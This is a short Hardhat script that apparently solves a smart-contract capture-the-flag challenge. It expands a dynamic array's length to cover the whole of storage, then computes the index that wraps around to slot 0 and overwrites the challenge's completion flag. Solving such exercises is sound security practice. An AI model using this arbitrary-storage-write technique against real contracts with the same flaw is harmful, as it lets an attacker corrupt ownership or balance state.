const { ethers } = require('hardhat');
const { BigNumber } = ethers;

const CHALLENGE_ADDRESS = '0x2a68c0beEe8a3d9B10468b909832037Fa404cb55';

async function main() {
  const MappingChallenge = await ethers.getContractFactory('MappingChallenge');
  const contract = await MappingChallenge.attach(CHALLENGE_ADDRESS);

  const MAX_UINT = BigNumber.from(2).pow(256);
  await contract.set(MAX_UINT.sub(2), 0);

  // N.B: this is equal to `keccak256(1)` in solidity
  const mapSlot = ethers.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001');
  const targetSlot = MAX_UINT.sub(mapSlot);
  await contract.set(targetSlot, 1);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
